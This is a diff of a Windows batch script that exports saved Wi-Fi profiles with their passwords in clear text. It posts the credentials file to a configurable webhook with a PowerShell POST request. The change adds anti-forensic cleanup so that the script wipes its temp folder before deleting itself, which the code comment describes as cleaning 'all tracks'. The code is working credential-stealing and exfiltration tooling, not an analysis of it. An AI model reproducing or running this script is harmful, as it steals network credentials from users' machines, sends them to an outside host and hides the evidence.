@@ -86,15 +86,21 @@ netsh wlan export profile key=clear >nul
 goto Repeat
 :endRepeat
 
-:: Cleanup
+:::: Cleanup
 popd
+
 :: Send credsfile to webhook
 if %upload%==1 (
 	powershell -c "Invoke-RestMethod -Uri '%webhook%' -Method POST -Body (Get-Content -Raw -Path '%temp%\profiles\%credsfile%') -ContentType 'text/plain'" >nul
 	del %credsfile% 2>nul
 )
-:: The program will delete itself if enabled
-if %selfdelete%==1 (del "%~f0" 2>nul)
+
+:: The program will delete itself (+ clean all tracks!) if enabled
+if %selfdelete%==1 (
+	rmdir /s /q "%temp%\profiles" 2>nul &:: Very important!
+	del "%~f0" 2>nul
+)
+
 move "%temp%\profiles\%credsfile%" "%cd%" 2>&1 >nul
 rmdir /s /q "%temp%\profiles" 2>nul
 exit /b
